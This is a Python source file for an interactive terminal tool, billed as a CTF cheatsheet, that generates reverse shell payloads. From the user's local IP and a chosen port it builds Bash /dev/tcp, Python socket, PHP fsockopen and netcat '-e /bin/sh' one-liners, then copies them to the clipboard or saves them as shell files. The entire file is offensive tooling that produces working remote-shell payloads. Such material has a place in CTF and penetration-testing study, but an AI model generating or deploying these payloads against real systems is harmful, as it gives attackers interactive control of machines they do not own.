#!/usr/bin/python3
# -*- coding: utf-8 -*-

from re import M
import sys
import os
import pyperclip
from time import sleep
from colorama import Fore
from colorama import Style
from netifaces import interfaces, ifaddresses, AF_INET

ipadd = "0.0.0.0" #Global variable for IP address
port = "0000" #Global variable for port
interf = "N/A" #Global variable for interface

#Main function
def main():
    banner = f"""{Style.BRIGHT}{Fore.MAGENTA}   ________               __  _____ __              __     __________________
  / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
 / /   / __ \/ _ \/ __ `/ __/\__ \/ __ \/ _ \/ _ \/ __/  / /     / / / /_    
{Fore.CYAN}/ /___/ / / /  __/ /_/ / /_ ___/ / / / /  __/  __/ /_   / /___  / / / __/    
\____/_/ /_/\___/\__,_/\__//____/_/ /_/\___/\___/\__/   \____/ /_/ /_/      {Fore.RESET}{Style.RESET_ALL}
                                                                             """
    print(banner)
    print('<------------------------------------------------------->')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} Welcome to the Cheatsheet')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} This tool is made to help you through the process of CTFs')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} You can use this tool : to create a reverse shell, bruteforce a password, and a lot more')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} Made by : {Style.BRIGHT}{Fore.LIGHTCYAN_EX}https://github.com/Oxooi{Fore.RESET}{Style.RESET_ALL}')
    print("")
    print("+-------------------------------------+")
    print(f"|{Fore.YELLOW}[1] {Fore.LIGHTYELLOW_EX}Create Reverse Shells{Fore.RESET}            |")
    print(f"|{Fore.YELLOW}[2] {Fore.LIGHTYELLOW_EX}Netcat Connection{Fore.RESET}                |")
    print(f"|{Fore.YELLOW}[3] {Fore.LIGHTYELLOW_EX}Set Interface IP{Fore.RESET} ({Fore.LIGHTRED_EX}IMPORTANT{Fore.RESET})     |")
    print("+-------------------------------------+")
    print("")
    print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Local IP {Fore.RESET}: " + ipadd + f"{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Interface {Fore.RESET}: " + interf + f"{Style.RESET_ALL}")
    print("\n\n-------------")
    choice = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter your choice : ')
    match choice:                                                       #Match choice
        case '1':                                                      #Create reverse shell
            revershell()
        case '2':                                                     #Netcat connection
            netcat()
        case '3':                                                    #Set interface IP
            setIp()
            backtomain()

#Banner function
def banner():
    banner = f"""{Style.BRIGHT}{Fore.LIGHTYELLOW_EX}______                             _____ _          _ _
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
{Fore.LIGHTRED_EX}| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|{Fore.RESET}{Style.RESET_ALL}
<------------------------------------------------------->
"""
    print(banner)


#Get IP of interface function
def getIp(interface):
    ipInt = ifaddresses(interface)[AF_INET][0]['addr']
    return ipInt

def getInterfaces(): #Get interfaces function
    #Loop through interfaces to get names and IPs
    x = 0
    for i in interfaces():
        x += 1
        print(Fore.GREEN + "\n[+] " + Style.BRIGHT + Fore.LIGHTBLUE_EX + i + Style.RESET_ALL + Fore.RESET)
        addresses = [i['addr'] for i in ifaddresses(i).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        print(' ' + Fore.GREEN +'└─> ' + Style.RESET_ALL + '(' + Style.BRIGHT +'\t'.join(addresses) + Style.RESET_ALL + ')')


#Set IP to global variable 'ipadd'
def setIp():
    getInterfaces()
    interface = input(f'\n{Fore.YELLOW}[*]{Fore.RESET}{Style.BRIGHT} Enter the interface (lo,eth0,wlan0) :{Style.RESET_ALL} ')
    getIp(interface)
    globals()['ipadd'] = getIp(interface)
    globals()['interf'] = interface

def choice(shell, extention): #Choice for reverse shell
    choice = input(
        f'\n{Fore.YELLOW}[*]{Fore.RESET} Do you want to {Fore.YELLOW}Copy{Fore.RESET} your shell to clipboard or export as {Fore.RED}File{Fore.RESET} ? ({Fore.YELLOW}c{Fore.RESET}/{Fore.RED}f{Fore.RESET}) : ')
    match choice:                                                                   #Match choice
        case 'c':                                                                   #Case C for copy to clipboard
            pyperclip.copy(shell)                                                   #Copy reverse shell command to clipboard
            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is copied to Clipboard")
            sleep(1)
            backtomain()                                                            #Go back to main menu
        case 'f':                                                                   #Case F for export as file
            file = "shell." + extention                                                       #Create file name
            with open(file, "w") as f:                                              #Open file and write reverse shell command
                f.write(shell)                                                      #Write reverse shell command to file
            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is exported as " + file)
            sleep(1)
            backtomain()
    return shell, extention

#Go back to main menu function
def backtomain():
    print(f'\n{Fore.YELLOW}[*]{Fore.RESET} Go back to main')
    sleep(1)
    os.system('clear')
    main()

#The main function for reverse shells
def revershell():
    os.system('clear')
    banner()
    shells = f"""  
- [{Style.BRIGHT}1{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Bash {Fore.BLUE}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}2{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTCYAN_EX}Python {Fore.CYAN}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}3{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTGREEN_EX}PHP {Fore.GREEN}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}4{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}Netcat {Fore.MAGENTA}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}6{Style.RESET_ALL}] {Style.BRIGHT}Exit {Style.RESET_ALL}
"""
    print(shells)
    c_rs = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter your choice : ') #Choice for reverse shell
    match c_rs:  #Match choice
        case '1': #Bash reverse shell
            bash()
        case '2': #Python reverse shell
            python()
        case '3': #PHP reverse shell
            php()
        case '4': #Netcat reverse shell
            nc()
        case '6': #Exit
            backtomain()

#Bash reverse shell function
def bash():
    os.system('clear')
    banner()
    port1 = "1234"                                                                  #Setup default port for reverse shell
    if ipadd == "0.0.0.0":                                                          #Check if IP address and Interface  is set
        print(f"{Fore.RED}[!] {Fore.LIGHTRED_EX}You need to set your interface ip" + Fore.RESET)
        setIp()
        bash()                                                                      #Callback bash function 
    else:                                                                           #If IP address and Interface is set
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1                                                            #If no port is entered, use default port
        else:
            globals()['port'] = port                                                #If port is entered, set it to global variable
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'                   #Create reverse shell command
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "sh")                                                             #Call choice function for reverse shell


def python():                                                                       #Python reverse shell function
    os.system('clear')                                                              #Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":                                                         
        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
        setIp()
        python()
    else:
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ipadd + \
        '",' + port + \
            '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "py")
    


def php():                                                                         #PHP reverse shell function
    os.system('clear')                                                            #Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
        setIp()
        php()
    else:
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = "php -r '$sock=fsockopen(" + ipadd + \
        "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "php")


def nc():                                                                         #Netcat reverse shell function
    os.system('clear')                                                           #Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
        setIp()
        nc()
    else:
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = "nc -e /bin/sh " + ipadd + " " + port
    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "sh")
    


def netcat():
    os.system('clear')
    banner = """
███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
<------------------------------------------------------->"""
    print(banner)


main()
